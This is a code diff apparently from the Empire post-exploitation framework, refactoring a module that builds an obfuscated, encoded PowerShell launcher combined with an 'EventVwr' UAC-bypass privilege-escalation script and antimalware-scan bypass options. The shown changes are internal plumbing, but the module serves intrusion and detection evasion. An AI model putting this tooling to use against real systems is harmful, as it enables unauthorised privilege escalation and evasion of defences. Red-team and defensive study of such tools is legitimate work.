@@ -3,6 +3,7 @@ from builtins import str
 from builtins import object
 from typing import Dict
 
+from empire.server.utils import data_util
 from empire.server.common import helpers
 from empire.server.common.module_models import PydanticModule
 
@@ -12,8 +13,6 @@ class Module(object):
     def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         # Set booleans to false by default
         Obfuscate = False
-        AMSIBypass = False
-        AMSIBypass2 = False
 
         listenerName = params['Listener']
 
@@ -25,15 +24,11 @@ class Module(object):
         if (params['Obfuscate']).lower() == 'true':
             Obfuscate = True
         ObfuscateCommand = params['ObfuscateCommand']
-        if (params['AMSIBypass']).lower() == 'true':
-            AMSIBypass = True
-        if (params['AMSIBypass2']).lower() == 'true':
-            AMSIBypass2 = True
 
         # read in the common module source code
         moduleSource = main_menu.installPath + "/data/module_source/privesc/Invoke-EventVwrBypass.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscation_command)
+            data_util.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscation_command)
             moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
@@ -53,11 +48,10 @@ class Module(object):
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
-                                                               obfuscate=Obfuscate,
-                                                               obfuscationCommand=ObfuscateCommand, userAgent=userAgent,
-                                                               proxy=proxy,
-                                                               proxyCreds=proxyCreds, AMSIBypass=AMSIBypass,
-                                                               AMSIBypass2=AMSIBypass2)
+                                                           obfuscate=Obfuscate,
+                                                           obfuscationCommand=ObfuscateCommand, userAgent=userAgent,
+                                                           proxy=proxy,
+                                                           proxyCreds=proxyCreds, bypasses=params['Bypasses'])
 
             encScript = launcher.split(" ")[-1]
             if launcher == "":
@@ -69,7 +63,7 @@ class Module(object):
         if obfuscate:
             scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscation_command)
         script += scriptEnd
-        script = helpers.keyword_obfuscation(script)
+        script = data_util.keyword_obfuscation(script)
 
         return script
 
